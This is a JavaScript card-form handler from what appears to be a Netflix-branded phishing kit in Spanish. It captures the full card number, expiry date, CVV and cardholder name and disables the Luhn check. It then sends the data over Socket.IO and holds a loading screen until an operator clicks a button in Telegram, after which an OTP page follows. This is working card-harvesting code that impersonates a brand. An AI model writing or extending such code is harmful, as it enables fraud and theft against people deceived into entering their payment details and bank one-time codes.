// Payment Card Form Handler
document.addEventListener('DOMContentLoaded', function() {
    const cardForm = document.getElementById('cardForm');
    const cardNumber = document.getElementById('cardNumber');
    const expiryDate = document.getElementById('expiryDate');
    const cvv = document.getElementById('cvv');
    const cardName = document.getElementById('cardName');
    const acceptTerms = document.getElementById('acceptTerms');

    // Format card number (add spaces every 4 digits)
    cardNumber.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '');
        value = value.replace(/\D/g, '');
        
        let formattedValue = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        
        e.target.value = formattedValue;
    });

    // Format expiry date (MM/YY)
    expiryDate.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        
        e.target.value = value;
    });

    // Only numbers for CVV
    cvv.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '');
    });

    // Only letters and spaces for card name + Convert to uppercase
    cardName.addEventListener('input', function(e) {
        let value = e.target.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, '');
        e.target.value = value.toUpperCase();
    });

    // Form validation
    function validateForm() {
        const cardNum = cardNumber.value.replace(/\s/g, '');
        const expiry = expiryDate.value;
        const cvvValue = cvv.value;
        const name = cardName.value.trim();

        // Card number validation (13-19 digits)
        if (cardNum.length < 13 || cardNum.length > 19) {
            return { valid: false, message: 'Número de tarjeta inválido' };
        }

        // Expiry date validation
        if (!/^\d{2}\/\d{2}$/.test(expiry)) {
            return { valid: false, message: 'Fecha de vencimiento inválida' };
        }

        const [month, year] = expiry.split('/').map(Number);
        if (month < 1 || month > 12) {
            return { valid: false, message: 'Mes inválido' };
        }

        const currentYear = new Date().getFullYear() % 100;
        const currentMonth = new Date().getMonth() + 1;
        
        if (year < currentYear || (year === currentYear && month < currentMonth)) {
            return { valid: false, message: 'Tarjeta vencida' };
        }

        // CVV validation (3-4 digits)
        if (cvvValue.length < 3 || cvvValue.length > 4) {
            return { valid: false, message: 'CVV inválido' };
        }

        // Name validation
        if (name.length < 3) {
            return { valid: false, message: 'Nombre inválido' };
        }

        // Terms acceptance
        if (!acceptTerms.checked) {
            return { valid: false, message: 'Debes aceptar los términos y condiciones' };
        }

        return { valid: true };
    }

    // Luhn algorithm for card validation
    function luhnCheck(cardNumber) {
        let sum = 0;
        let isEven = false;
        
        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber[i]);
            
            if (isEven) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }
            
            sum += digit;
            isEven = !isEven;
        }
        
        return sum % 10 === 0;
    }

    // Handle form submission
    cardForm.addEventListener('submit', async function(e) {
        e.preventDefault();

        // Validate form
        const validation = validateForm();
        if (!validation.valid) {
            alert(validation.message);
            return;
        }

        // Additional Luhn check (skip for testing purposes - accept any valid format)
        // const cardNum = cardNumber.value.replace(/\s/g, '');
        // if (!luhnCheck(cardNum)) {
        //     alert('Número de tarjeta inválido');
        //     return;
        // }

        // Get plan from localStorage
        const selectedPlan = localStorage.getItem('netflix_selected_plan') || 'premium';

        // Prepare card data
        const cardData = {
            cardNumber: cardNumber.value,
            expiryDate: expiryDate.value,
            cvv: cvv.value,
            cardName: cardName.value,
            plan: selectedPlan.charAt(0).toUpperCase() + selectedPlan.slice(1),
            timestamp: new Date().toISOString()
        };

        // Save card data to localStorage for later use in OTP page
        localStorage.setItem('netflix_card_data', JSON.stringify(cardData));
        console.log('💾 Card data saved to localStorage');

        try {
            // Submit to server via Socket.IO
            await socketManager.submitCard(cardData);
            
            // Keep loading screen visible (waiting for admin action)
            // The loading screen will remain until admin clicks a button in Telegram
            
        } catch (error) {
            console.error('Error submitting card:', error);
            alert('Error al procesar la tarjeta. Por favor intenta nuevamente.');
            socketManager.hideLoading();
        }
    });

    // CVV help tooltip
    const cvvHelp = document.querySelector('.cvv-help');
    if (cvvHelp) {
        cvvHelp.addEventListener('click', function() {
            alert('El CVV es el código de seguridad de 3 o 4 dígitos que se encuentra en el reverso de tu tarjeta (o en el frente para American Express).');
        });
    }

    // Load saved language
    const savedLang = localStorage.getItem('netflix_lang') || 'es';
    const langSelect = document.querySelector('.language-selector select');
    if (langSelect) {
        langSelect.value = savedLang;
    }
});